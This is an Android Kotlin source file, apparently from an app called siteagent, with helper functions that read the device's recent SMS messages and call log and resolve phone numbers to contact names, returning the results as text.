package com.siteagent
import android.content.Context
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony

object Data {
    fun name(c: Context, num: String): String? = try {
        val u = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(num))
        c.contentResolver.query(u, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
            ?.use { if (it.moveToFirst()) it.getString(0) else null }
    } catch (e: Exception) { null }

    fun sms(c: Context): String = try {
        c.contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, arrayOf("address", "body"), null, null, "date DESC")?.use {
            val l = mutableListOf<String>()
            while (it.moveToNext() && l.size < 8) { val a = it.getString(0) ?: ""; l.add("${name(c, a) ?: a}: ${it.getString(1)}") }
            l.joinToString("\n")
        } ?: ""
    } catch (e: Exception) { "" }

    fun calls(c: Context): String = try {
        c.contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf("number", "type", "name"), null, null, "date DESC")?.use {
            val l = mutableListOf<String>()
            while (it.moveToNext() && l.size < 8) {
                val kind = when (it.getInt(1)) { 1 -> "incoming"; 2 -> "outgoing"; 3 -> "missed"; else -> "other" }
                l.add("$kind: ${it.getString(2) ?: it.getString(0)}")
            }
            l.joinToString("\n")
        } ?: ""
    } catch (e: Exception) { "" }
}
